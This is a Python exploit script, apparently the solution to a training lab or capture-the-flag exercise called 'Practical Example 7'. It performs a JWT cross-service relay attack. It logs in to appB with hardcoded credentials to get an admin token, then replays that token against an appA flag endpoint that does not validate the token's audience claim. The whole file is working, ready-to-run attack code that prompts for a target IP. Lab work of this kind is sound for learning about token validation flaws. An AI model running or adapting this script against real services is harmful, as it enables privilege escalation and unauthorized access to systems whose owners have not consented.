import requests
import json
import sys

# --- Configuration for Example 7: Cross-Service Relay ---
# NOTE: The script will prompt the user for the specific IP.
USERNAME = "user"
PASSWORD_E7 = "password7"

# Base URL paths (IP is dynamically inserted at runtime)
AUTH_URL_E7_BASE = "/api/v1.0/example7"
APP_A_FLAG_URL_E7_BASE = "/api/v1.0/example7_appA?username=admin"
# --------------------------------------------------------

def exploit_example7(ip_address):
    """
    Exploits Example 7 (Cross-Service Relay) by authenticating to appB (admin: true)
    and using that token against the vulnerable appA endpoint.
    
    """
    print(f"[*] Exploit 7: Starting Cross-Service Relay Attack (IP: {ip_address})")
    
    # Full URLs for Example 7
    auth_url = f"http://{ip_address}{AUTH_URL_E7_BASE}"
    app_a_flag_url = f"http://{ip_address}{APP_A_FLAG_URL_E7_BASE}"
    
    # Step 1: Authenticate to appB to receive an admin token with audience 'appB'
    print(f"\n[1/3] Authenticating to {auth_url} with 'application': 'appB' (This app grants admin: 1)")
    auth_data = json.dumps({
        "username": USERNAME, 
        "password": PASSWORD_E7, 
        "application": "appB" # Target appB which grants admin privileges
    })

    try:
        response = requests.post(
            auth_url,
            data=auth_data,
            headers={'Content-Type': 'application/json'}
        )
        response.raise_for_status()
        data = response.json()
        
        if 'token' not in data:
            print("[-] Error: 'token' not found in response from appB authentication.")
            print(f"Response: {data}")
            return

        admin_token_appb = data['token']
        print(f"[+] Admin Token from appB retrieved: {admin_token_appb[:60]}...")
        # Display claims for verification purposes
        if 'claims' in data:
            print(f"[i] Claims received: {data['claims']}") 

    except requests.exceptions.RequestException as e:
        print(f"[-] HTTP Request Failed during appB authentication: {e}")
        return
    except json.JSONDecodeError:
        print(f"[-] Error: Failed to decode JSON response. Received: {response.text}")
        return

    # Step 2: Relay the admin token intended for appB to the vulnerable appA endpoint
    # The vulnerability is that appA fails to check the 'aud' claim which is set to 'appB'.
    print(f"\n[2/3] Relaying appB admin token to vulnerable appA flag endpoint: {app_a_flag_url}")

    try:
        flag_response = requests.get(
            app_a_flag_url,
            headers={'Authorization': f'Bearer {admin_token_appb}'}
        )
        
    except requests.exceptions.RequestException as e:
        print(f"[-] HTTP Request Failed during appA flag attempt: {e}")
        return

    # Step 3: Display the result (flag)
    print("\n[3/3] Displaying Result from appA:")
    print("-" * 50)
    print(f"Example 7 Result (Cross-Service Relay):")
    print(f"Request URL: {app_a_flag_url}")
    print(f"Response Status: {flag_response.status_code}")
    print("Response Body (Flag likely here):")
    print(flag_response.text.strip())
    print("-" * 50)


if __name__ == "__main__":
    
    print("--- JWT Cross-Service Relay Exploiter (Example 7) ---")
    
    e7_ip = input("Please enter the target IP address for Practical Example 7: ").strip()
    
    if e7_ip:
        exploit_example7(e7_ip)
    else:
        print("IP address required. Exiting.")
        sys.exit(0)